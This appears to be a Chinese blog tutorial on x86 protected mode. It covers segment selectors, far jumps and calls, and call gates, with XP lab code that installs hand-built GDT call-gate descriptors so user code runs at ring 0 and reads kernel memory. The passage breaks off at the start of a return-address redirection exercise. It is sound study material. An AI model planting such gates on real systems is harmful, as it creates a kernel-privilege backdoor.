<p>&lt;3&gt; 详细描述这下面代码的执行过程：<br>mov ax,0x23<br>mov ds,ax<br>段选择子是0x0023，RPL&#x3D;11b&#x3D;3，属于最低权限，只能访问DPL&#x3D;3的数据段。而CPL则无影响，不管是0环还是3环，都满足CPL&lt;&#x3D;RPL，只要RPL满足，CPL也一定满足。</p>
<p>当执行 mov ds,ax 时，CPU先解析段选择子0023，然后去GDT表找段描述符，检查段描述符P位是否有效，然后检查S位，确认是数据段或代码段，然后检查TYPE域确认是数据段，然后看DPL是否等于3.只要上述条件都满足，则mov指令执行成功，只要有一条不满足，mov失败。</p>
<h2 id="2-断间跳转JMP-FAR"><a href="#2-断间跳转JMP-FAR" class="headerlink" title="2 断间跳转JMP FAR"></a>2 断间跳转JMP FAR</h2><p><strong>3环执行JMP FAR并不能提权（CPL不改变）。</strong></p>
<p>可参看：<a href="https://blog.csdn.net/Kwansy/article/details/108813337">《（8）JMP FAR段间跳转》</a>、<a href="https://www.anquanke.com/post/id/258060#h2-0">《深耕保护模式（二）》</a></p>
<p>要点回顾：</p>
<p>段寄存器：ES、CS、SS、DS、FS、GS、LDTR、TR<br>段寄存器读写：除CS外，其他的段寄存器都可以通过MOV,LES,LSS,LDS,LFS,LGS,LTR（仅在0环之行）指令进行修改。</p>
<p><strong>CS为什么不可以直接修改呢？</strong></p>
<p>CS为代码段，CS的改变意味着EIP的改变，改变CS的同时必须修改EIP和SS，SS改变就必须修改堆栈，所以我们无法使用上面的指令来进行修改。</p>
<p>段间跳转，有两种情况，即要跳转的段是一致代码段还是非一致代码段（参见代码段type域）。</p>
<div class="note warning"><p><strong>同时修改CS与EIP的指令：</strong></p>
<p>JMP FAR &#x2F; CALL FAR &#x2F; RETF &#x2F; INT &#x2F;IRETED</p>
<p><strong>只改变EIP的指令：</strong></p>
<p>JMP &#x2F; CALL &#x2F; JCC &#x2F; RET</p>
</div>

<div class="note danger"><p><strong>一致代码段</strong>：也就是共享的段，要求：CPL &gt;&#x3D; DPL。</p>
<ul>
<li><strong>特权级高的程序不允许访问特权级低的数据</strong>：核心态不允许访问用户态的数据</li>
<li><strong>特权级低的程序可以访问到特权级高的数据</strong>，但特权级不会改变：用户态还是用户态</li>
</ul>
<p><strong>非一致代码段：</strong>普通代码段（Windows使用），要求：CPL &#x3D; DPL 并且 RPL &lt;&#x3D; DPL。</p>
<ul>
<li><strong>只允许同级访问</strong> </li>
<li>绝对禁止不同级别的访问：核心态不是用户态，用户态也不是核心态</li>
</ul>
</div>

<p><strong>代码间的跳转(段间跳转 非调用门之类的) 执行流程</strong></p>
<p>JMP 0x20:0x004183D7 CPU如何执行这行代码？</p>
<p><strong>（1）段选择子拆分</strong></p>
<p>0x20 对应二进制形式 0000 0000 0010 0000</p>
<ul>
<li>RPL &#x3D; 00</li>
<li>TI &#x3D; 0</li>
<li>Index &#x3D; 4</li>
</ul>
<p><strong>（2） 查表得到段描述符</strong></p>
<p>TI &#x3D; 0 所以查GDT表</p>
<p>Index &#x3D; 4 找到对应的段描述符，并不是所有的段描述符都可以跳转。</p>
<p>四种情况可以跳转：<mark class="label warning">代码段、调用门、TSS任务段、任务门</mark>。</p>
<p><strong>（3）权限检查</strong></p>
<p>如果是非一致代码段，要求：CPL &#x3D; DPL 并且 RPL &lt;&#x3D; DPL。</p>
<p>如果是一致代码段，要求：CPL &gt;&#x3D; DPL。</p>
<p>简要说明什么是一致代码段什么是非一致代码段。</p>
<blockquote>
<p>一致代码段又称共享代码段。假设操作系统有一段代码是提供了某些通用功能，这段代码并不会对内核产生影响，并希望这些功能能够被应用层(三环程序)直接使用，即可让一直代码段去修饰这块代码。这也是为什么一致代码段要求：CPL &gt;&#x3D; DPL(当前权限比描述权限低)就可以了。这段代码就是给低权限的应用使用的。</p>
<p>非一致代码段相反，严格控制权限。</p>
</blockquote>
<p><strong>（4）加载段描述符</strong></p>
<p>通过上面的权限检查后，CPU会将段描述符加载到CS段寄存器中.</p>
<p><strong>（5）代码执行</strong></p>
<p>CPU将 CS.Base + Offset 的值写入EIP 然后执行CS:EIP处的代码，段间跳转结束.</p>
<p>注意：直接对代码段进行JMP 或者 CALL的操作，无论目标是一致代码段还是非一致代码段，CPL都不会发生改变.如果要提升CPL的权限，只能通过<strong>调用门</strong>。</p>
<h3 id="2-1-练习：非一致性代码段跳转"><a href="#2-1-练习：非一致性代码段跳转" class="headerlink" title="2.1 练习：非一致性代码段跳转"></a>2.1 练习：非一致性代码段跳转</h3><p>条件：非一致性代码段跳转，只允许同级访问：CPL&#x3D;3的CPU只允许访问DPL&#x3D;3的代码</p>
<p>要求分析：</p>
<p>（1）<strong>CPL&#x3D;DPL&#x3D;0x11，RPL&lt;&#x3D;DPL</strong>，则RPL可为0x00或0x11，TI&#x3D;0，则选择子：0x–000&#x2F;0x–011；</p>
<p>（2）因为要修改CS，所以段描述符的Type域应该是Code —- Type最高位为1，则Type为：0x1xxx；</p>
<p>（3）非一致性代码—-Type次高位为0，则Type为：0x10xx —- &gt;&#x3D;0x8；</p>
<p>（4）P、DPL、S（因为要修改CS，S&#x3D;1）位分别为：0x1111 —- F。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/2s4piJ5AOWluU1n.png" alt="18.png"></p>
<p>段选择子分别为以下两种情况：</p>
<p><strong>本练习以段选择子中RPL &#x3D; 0x11为例</strong></p>
<p>该描述符即指向一个非代码段，我们需要构造一个段选择子来找到该描述符，然后将该段描述符加载到CS寄存器，最后执行跳转。</p>
<p>步骤一：</p>
<p>根据段描述符构造段选择子：</p>
<p>（1）该段描述符为第四个，Index&#x3D;3</p>
<p>（2）TI&#x3D;0（查GDT）</p>
<p>（3）RPL&#x3D;0x11，如果此例RPL&#x3D;0x00，则修改CS时会发生错误。因为非一致性代码跳转不改变CPU权限CPL。</p>
<p>（4）段选择子&#x3D;0x0011 0 11&#x3D;0x1B</p>
<p>（5）Base&#x3D;0，G&#x3D;1则Limit&#x3D;0xFFFFFFFF，则Offset可随意构造</p>
<p>（6）JMP FAR格式：CS:EIP&#x3D;1B:0xxxxxxxx，跳转地址为：CS.Base+Offset</p>
<p>（7）<strong>如果执行成功，应该会修改CS和EIP</strong></p>
<p>步骤二：</p>
<p>打开OD观察此时的CS&#x3D;0x1B、EIP&#x3D;0x00441EC如下图</p>
<p><img data-src="https://s2.loli.net/2021/12/16/lqxMnHeQzXGyvaV.png" alt="19.png"></p>
<p>步骤三：</p>
<p>为了能看到CS变化，则当前的段描述符的位置需要修改，可以将该段描述符复制到0x8003F048处，该处目前为0（P&#x3D;0），如果复制到一个原先P&#x3D;1的段描述符可能会卡死或者蓝屏。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/WX5ozUf4IZx2cr9.png" alt="20.png"></p>
<p>此时段选择子Index&#x3D;9 —- 0x1001 0 11&#x3D;0x4B，在XP中，修改此时的EIP地址处：JMP FAR 004B:0x0044420C，单步F8看CS、EIP变化。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/3YnZtWK2AVzTSi8.png" alt="21.png"></p>
<div class="note default"><p><strong>结论：</strong></p>
<ol>
<li><p>非一致性代码段JMP FAR跳转时，满足段权限检查：CPL&#x3D;DPL&#x3D;0x11，RPL&lt;&#x3D;DPL即能成功。</p>
</li>
<li><p><strong>如果此例RPL&#x3D;0x00，则修改CS时会发生错误。因为JMP FAR不改变CPU权限CPL。</strong></p>
</li>
<li><p>所以3环的非一致性代码跳转成功条件：<strong>CPL&#x3D;DPL&#x3D;0x11，RPL&lt;&#x3D;DPL，RPL&#x3D;0x11</strong>。</p>
</li>
</ol>
</div>

<h3 id="2-2-练习：一致性代码段跳转"><a href="#2-2-练习：一致性代码段跳转" class="headerlink" title="2.2 练习：一致性代码段跳转"></a>2.2 练习：一致性代码段跳转</h3><p>条件：<strong>只允许低权限的程序访问高权限的代码：CPL&#x3D;3的CPU只允许访问DPL&#x3D;0的代码</strong>。</p>
<p>要求：</p>
<p>（1）目前CPL&#x3D;3，则P&#x3D;1，DPL&#x3D;00，S&#x3D;1（因为要修改CS。DATA&#x2F;CODE），1001&#x3D;9</p>
<p>（2）Type：Decimal&#x3D;1（代码段），C&#x3D;1（一致性代码），11xx&gt;&#x3D;0xC，由于此时的的CPL&#x3D;0x11，因为不能修改特权级别，所以RPL必须RPL&#x3D;0x11</p>
<p>（3）构造段选择子0x004B</p>
<p>直接构造一个：00cf<strong>9F</strong>00&#96;0000ffff</p>
<p><img data-src="https://s2.loli.net/2021/12/16/BS6VDfrvMzhk1RH.png" alt="22.png"></p>
<p>重启一下OD，让CS复位如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/WepnhoVQUHCtxDl.png" alt="23.png"></p>
<p>OD中EIP指向的地址构造：JMP FAR 004B:0x0044420D，F8单步看CS、EIP变化。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/TFt1aQp7xCZXIqe.png" alt="24.png"></p>
<div class="note default"><p><strong>结论：</strong></p>
<ol>
<li><p>一致性代码段JMP FAR跳转时，满足段权限检查：CPL&gt;DPL即能成功。</p>
</li>
<li><p><strong>如果此例RPL&#x3D;0x00，则修改CS时会发生错误。因为JMP FAR不改变CPU权限CPL。</strong></p>
</li>
<li><p>所以3环的一致性代码跳转成功条件：<strong>CPL&gt;DPL，RPL&#x3D;0x11</strong>。</p>
</li>
</ol>
</div>

<h3 id="2-3-总结"><a href="#2-3-总结" class="headerlink" title="2.3 总结"></a>2.3 总结</h3><p>1、<strong>为了对数据进行保护，普通代码段是禁止不同级别进行访问的</strong>。用户态的代码不能访问内核的数据，同样，内核态的代码也不能访问用户态的数据.<br>2、如果想提供一些通用的功能，而且这些功能并不会破坏内核数据，那么可以选择一致代码段，这样低级别的程序可以在不提升CPL权限等级的情况下即可以访问.<br>3、如果想访问普通代码段，只有通过“调用门”等提示CPL权限，才能访问。</p>
<h2 id="3-长调用与短调用"><a href="#3-长调用与短调用" class="headerlink" title="3 长调用与短调用"></a>3 长调用与短调用</h2><p>通过JMP FAR可以实现段间的跳转，如果要实现跨段的调用就必须要学习CALL FAR，也就是<mark class="label danger">长调用</mark>。也叫<strong>代码跨段跳转</strong>CALL FAR。</p>
<p>CALL FAR 比JMP FAR要复杂，JMP并不影响堆栈，但CALL指令会影响。</p>
<ul>
<li><strong>JMP FAR</strong>：段间跳转，不能提权。</li>
<li><strong>CALL FAR</strong>：跨段跳转，可以提权。</li>
</ul>
<p>Windows只使用非一致性代码段，没有使用一致性代码段。</p>
<p>CPU提供了<strong>任务</strong>切换，但是Windows没有使用CPU提供的机制，而是自己用操作系统实现了<strong>线程</strong>切换。</p>
<h3 id="3-1-短调用"><a href="#3-1-短调用" class="headerlink" title="3.1 短调用"></a>3.1 短调用</h3><p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL 立即数/寄存器/内存</span><br></pre></td></tr></table></figure>

<p>堆栈变化：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/wiCemuUPQsk3p2I.png" alt="25.png"></p>
<h3 id="3-2-长调用（不提权）"><a href="#3-2-长调用（不提权）" class="headerlink" title="3.2 长调用（不提权）"></a>3.2 长调用（不提权）</h3><p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL CS:EIP(EIP是废弃的)</span><br></pre></td></tr></table></figure>

<p>CALL FAR 和 RETF 一般是成对的，RETF 的执行流程（权限控制）和 CALL FAR 是一样的，所以下面的堆栈图我就不画 RETF 了。</p>
<p>长调用跨段不提权时：<strong>3环跳转到另一个3环代码段，不会切换堆栈</strong>。</p>
<p>发生改变的寄存器：ESP EIP CS</p>
<p><strong>无参数的堆栈变化：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/17/YEWfJuSzIbpNahO.png" alt="26.png"></p>
<h3 id="3-3-长调用（提权）"><a href="#3-3-长调用（提权）" class="headerlink" title="3.3 长调用（提权）"></a>3.3 长调用（提权）</h3><div class="note info"><p><strong>提权，提的是CS寄存器的低两位CPL，而不是段选择子的低两位RPL。</strong></p>
</div>

<p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL CS:EIP(EIP是废弃的)</span><br></pre></td></tr></table></figure>

<p><strong>提权无参数：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/17/EnyJMRV9AUi1ulk.png" alt="27.png"></p>
<p><strong>提权有参数：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/17/iMu7p6VZkBzDjt1.png" alt="28.png"></p>
<ol>
<li>CALL CS:EIP EIP废弃不用，真正要跳转的地方是由段描述符装载进CS后的CS决定。</li>
<li>堆栈的变化：<strong>同一个线程从3环的堆栈切换到0环的堆栈</strong>。</li>
<li>在段描述符加载进CS之前，会将CS保存到堆栈，方便RETF回来时恢复原来的CS。</li>
<li>跨段的意思就是修改CS，不提权：CS段描述符的DPL&#x3D;CPL时，提权：CS段描述符的DPL &lt; CPL时。</li>
<li>RETF回去时也要进行权限检查。</li>
<li><strong>不管提不提权，调用门描述符的DPL&#x3D;0x11，如果不为3那么我们将无法访问到门描述符，敲门的资格都没有。</strong></li>
</ol>
<div class="note primary"><p>长调用的EIP是废弃的，所有信息都根据CS获取，这个CS是段选择子，指向GDT表中的一个特殊的段描述符，这个段描述符叫<strong>调用门</strong>。</p>
<p>Windows中没有使用调用门，需要自己去构造调用门。</p>
</div>

<p>跨段并提权的调用：新的CS、EIP来自段描述符，但是新的R0下的SS、ESP来自TSS（可理解为一块内存）。</p>
<div class="note success"><p><strong>总结</strong>： </p>
<ol>
<li><strong>跨段调用时，一旦有权限切换，就会切换堆栈</strong>（从R3的堆栈切换到R0的堆栈）。</li>
<li>CS的权限一旦改变，SS的权限也要随着改变，CS与SS的等级必须一样。</li>
<li>JMP FAR 只能跳转到同级非一致代码段，但CALL FAR可以通过调用门提权，提升CPL的权限。</li>
</ol>
</div>

<p>SS与ESP从哪里来？参见TSS段。</p>
<h2 id="4-调用门（无参）"><a href="#4-调用门（无参）" class="headerlink" title="4 调用门（无参）"></a>4 调用门（无参）</h2><p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL CS:EIP（EIP是废弃的）</span><br></pre></td></tr></table></figure>

<p>执行步骤：</p>
<ol>
<li>根据CS的值查GDT表，找到对应的段描述符，这个描述符是一个<strong>调用门</strong>。（S&#x3D;0，Type&#x3D;1100）</li>
<li>在调用门描述符中存储另一个代码段段的选择子。（具体看下图低四字节16到31位）</li>
<li>该选择子指向的段段.Base + 调用门偏移地址 &#x3D; 就是真正要执行的地址。</li>
</ol>
<p>为了能够访问不同特权级的代码段，处理器提供了一个特殊的描述符集合，叫做门描述符。以下是四种门描述符：</p>
<ul>
<li>调用门</li>
<li>陷阱门</li>
<li>中断门</li>
<li>任务门</li>
</ul>
<p>调用门段描述符结构：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/XG2MfN1EWKw965T.png" alt="29调用门描述符.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/17/Wif9KVxZNGjTHuF.png" alt="30.png"></p>
<div class="note default"><p>需要注意的几点：</p>
<ol>
<li>GDT表中四种情况可以跳转：<mark class="label danger">代码段、调用门、TSS任务段、任务门</mark>。</li>
<li><strong>Windows中没有使用调用门</strong>，需要自己去构造调用门。</li>
<li>如果从3环使用调用门，则DPL要为3，如果不为3那么我们将无法访问到门描述符，敲门的资格都没有。</li>
<li>ParamCount是传参用的，为参数个数。</li>
<li>Segenment Selector是段选择子，指向要加载到CS的的段描述符，也就是要执行的段描述符，RPL&#x3D;0x00&#x2F;0x11。</li>
</ol>
</div>

<h3 id="4-1-调用门段权限检查"><a href="#4-1-调用门段权限检查" class="headerlink" title="4.1 调用门段权限检查"></a>4.1 调用门段权限检查</h3><p><img data-src="https://s2.loli.net/2021/12/19/2ptJhca47nNfGOW.png" alt="61.png"></p>
<h3 id="4-2-练习：使用调用门进行调试"><a href="#4-2-练习：使用调用门进行调试" class="headerlink" title="4.2 练习：使用调用门进行调试"></a>4.2 练习：使用调用门进行调试</h3><p>本题要求：写代码实现一个调用门进行提权，并观察在3环和0环下的ESP、CS、SS段寄存器变化，观察3环进到0环时的堆栈。</p>
<p><strong>先使用自己代码的段选择子找到调用门，然后根据调用门去找要调用的段描述符</strong>。</p>
<p>调用门描述符的DPL必须&#x3D;0x11，因为使用VC6做实验，低4字节高16位（段选择子）要指向一个0环的代码段描述符才能完成本实验。</p>
<div class="note warning"><p><strong>要执行的程序入口地址 &#x3D; Call_Gate.Offset ⊕ CS.Base</strong></p>
</div>

<p>步骤：</p>
<ol>
<li><p>构造调用门段描述符，0x00000000&#96;00000000；（是DPL要为3，否则在3环无法访问到门描述符）</p>
<ul>
<li>P&#x3D;1，DPL&#x3D;11，S&#x3D;0，0x1110&#x3D;0xE，0x0000<strong>E</strong>000&#96;00000000；</li>
<li>调用门Type&#x3D;0x1100&#x3D;0xC，0x0000<strong>EC</strong>00&#96;00000000；</li>
<li><strong>构造选择子</strong>：调用门来执行提权，需要根据自身结构中隐含的段选择子去找一个DPL&#x3D;00的CS段描述符，可构造0x0008&#x2F;0x000B，0x0000<strong>EC00</strong>&#96;<strong>0008</strong>0000。剩下还需要构造一个偏移地址让CS去执行。</li>
</ul>
</li>
<li><p>将段描述符写入GDT表中<strong>P&#x3D;0</strong>的上面去，否则可能会卡死或蓝屏。</p>
<p><img data-src="https://s2.loli.net/2021/12/17/1JIQZMYLBr9U56e.png" alt="31.png"></p>
</li>
<li><p>构造偏移地址：</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> _declspec(naked) GetGdtRegister()</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">3</span>	<span class="comment">//此时的断点在0环</span></span><br><span class="line">        retf	<span class="comment">//不能是RET</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Buffer[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">    *(DWORD*)&amp;Buffer[<span class="number">0</span>] = <span class="number">0x12345678</span>; <span class="comment">//eip随便填</span></span><br><span class="line">    *(WORD*)&amp;Buffer[<span class="number">4</span>] = <span class="number">0x004B</span>;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        call fword ptr[Buffer]       <span class="comment">//call cs:eip   </span></span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/U5NMtLzP14dxmJ6.png" alt="31_1.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/17/flkgNpcjvKLdTb5.png" alt="32.png"></p>
<p>要执行的程序入口地址：0x00401020，则调用门段描述符：0x<strong>0040</strong>EC00&#96;0008<strong>1020</strong>。</p>
<p><img data-src="https://s2.loli.net/2021/12/17/KBJyWH7CvX9lhMp.png" alt="33.png"></p>
<p>观察3环下：ESP&#x3D;0x0012FF28，CS&#x3D;0x001B，SS&#x3D;0x0023。</p>
<p><strong>注意</strong>：在XP中继续执行时如果不取消此时设置的断点的话，从0环返回时将会卡死（目前应该在0环调试状态下）。</p>
<p>此时，取消断点，F5执行，观察Windbg。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/S93Yu2fBivCPkKw.png" alt="34.png"></p>
<p>观察0环下：ESP&#x3D;0xAA15ADD0，CS&#x3D;0x0008，SS&#x3D;0x0010。</p>
<div class="note danger"><p><strong>注意：</strong></p>
<ol>
<li>函数<code>GetGdtRegister()</code>虽然是我们在3环写的，但是通过调用门去执行的时候，该函数的执行权限为0环。</li>
<li><strong>提权后，通用寄存器的值不会发生改变</strong>。</li>
<li>我们的代码虽然写的是三环程序的int3，但是由于这里权限已经提升，断点异常已经不再是三环程序处理（内核相比应用层具有优先处理权），应有内核层处理。这里直观的感受就是，0环调试器(windbg)断点了，vc6无法断点。</li>
</ol>
</div>

<h3 id="4-3-练习：在0环读取GDT表数据"><a href="#4-3-练习：在0环读取GDT表数据" class="headerlink" title="4.3 练习：在0环读取GDT表数据"></a>4.3 练习：在0环读取GDT表数据</h3><p>既然已经提权到0环权限，那么我们就可以写只能在驱动开发中才能写的代码。</p>
<p>本题题目：读取gdt表打印、读取高2G内存中的值并打印。(三环权限是不能够读取高2G内存的，属于内核管理）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwH2GValue; <span class="comment">// 存储高2G的数据</span></span><br><span class="line">BYTE GDT[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,<span class="number">0x8003f00C</span>  <span class="comment">//读取高2G地址,GDT表的数据</span></span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov dwH2GValue,ebx</span><br><span class="line">		sgdt GDT;           <span class="comment">//读取GDTR寄存器（6字节）</span></span><br><span class="line">		</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintRegister</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD GDT_ADDR = *(PDWORD)(&amp;GDT[<span class="number">2</span>]);</span><br><span class="line">	WORD GDT_LIMIT=*(PWORD)(&amp;GDT[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08X %x %x\n&quot;</span>,dwH2GValue,GDT_ADDR,GDT_LIMIT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;	</span><br><span class="line">	PrintRegister();</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>F9下断点，获取FunctionHas0CPL()函数的入口地址。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/G8i2QSF6q1ofXMe.png" alt="35.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/eKSO2PUCYoxt7BH.png" alt="36.png"></p>
</li>
<li><p>修改调用门段描述符。0040EC00&#96;00081030</p>
<p><img data-src="https://s2.loli.net/2021/12/18/udfbCTh5l9iELQ4.png" alt="37.png"></p>
</li>
<li><p>将代码中的<code>int 3</code>注释后执行，否则无法正常从0环返回到3环。在XP的VC6中F5执行如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/OXzsq7d4YINPMgQ.png" alt="38.png"></p>
</li>
</ol>
<h2 id="5-调用门（有参数）"><a href="#5-调用门（有参数）" class="headerlink" title="5 调用门（有参数）"></a>5 调用门（有参数）</h2><p>有参数的调用门相比无参的调用门主要有两点变化：</p>
<ul>
<li>调用门段描述符带有参数的个数（如下图1）</li>
<li>从3环堆栈切换到0环的堆栈时参数在栈中的位置（如下图2）。</li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/18/vjakIbUDsi75WRh.png" alt="39.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/qSXlo1AbFQKJiLj.png" alt="28.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD x,y,z;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		<span class="comment">// pushad 和 pushfd 使ESP减小了 0x24 个字节</span></span><br><span class="line">		<span class="comment">// 原ESP+8就是参数1，+C就是参数2，+10就是参数3，详见堆栈图</span></span><br><span class="line">		<span class="comment">// 如果这里还有疑问，可以在windbg的内存窗口中观察</span></span><br><span class="line">		mov eax,[esp+<span class="number">0x24</span>+<span class="number">0x8</span>+<span class="number">0x8</span>] <span class="comment">// 参数3</span></span><br><span class="line">		mov dword ptr ds:[x],eax</span><br><span class="line">		mov eax,[esp+<span class="number">0x24</span>+<span class="number">0x8</span>+<span class="number">0x4</span>] <span class="comment">// 参数2</span></span><br><span class="line">		mov dword ptr ds:[y],eax</span><br><span class="line">		mov eax,[esp+<span class="number">0x24</span>+<span class="number">0x8</span>+<span class="number">0x0</span>] <span class="comment">// 参数1</span></span><br><span class="line">		mov dword ptr ds:[z],eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		retf <span class="number">0xC</span>	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push <span class="number">0x3</span></span><br><span class="line">		push <span class="number">0x2</span></span><br><span class="line">		push <span class="number">0x1</span></span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x %x %x\n&quot;</span>,x,y,z);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/18/xcimQ29yB6YSz78.png" alt="41.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/1nyxRj93E4HrUdc.png" alt="40_1.png"></p>
<ol>
<li><p>构造调用门有参数的段描述符：0040EC0<strong>3</strong>&#96;00081020。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/gWkicQ1hZs47aeu.png" alt="42.png"></p>
</li>
<li><p>回到XP中取消断点，F5执行，此时将会在断点在0环的int 3。观察堆栈和预期一样。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/utrVYAiXkqzfL7K.png" alt="43.png"></p>
<p>需要注释代码中的<code>int 3</code>才可以正常返回，执行结果如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/bVBdHL73DazmkTN.png" alt="44.png"></p>
</li>
</ol>
<h2 id="6-调用门阶段性测试"><a href="#6-调用门阶段性测试" class="headerlink" title="6 调用门阶段性测试"></a>6 调用门阶段性测试</h2><div class="note warning"><p><strong>关于0环的翻墙</strong>：3环的代码通过调用门执行0环权限下的代码后，RETF回来时<strong>通过修改返回地址跳到其他地方</strong>，即称为翻墙。</p>
</div>

<p>题目：</p>
<p>1、构造一个调用门，实现3环读取高2G内存。</p>
<p>2、在第一题的基础上进行修改，实现通过翻墙的方式返回到其他地址。</p>
<p>3、在第一题的基础上进行修改，在门中再建一个门跳转到其他地址。</p>
<p>要求：</p>
<p>代码正常执行不蓝屏。</p>
<h3 id="6-1-CALL-FAR翻墙"><a href="#6-1-CALL-FAR翻墙" class="headerlink" title="6.1 CALL FAR翻墙"></a>6.1 CALL FAR翻墙</h3><p>翻墙即不走原来的RETF，而是修改堆栈中保存的返回地址，跳转到其他地址。</p>
<p>本题以无参函数示例。</p>
<p>步骤：</p>
<ol>
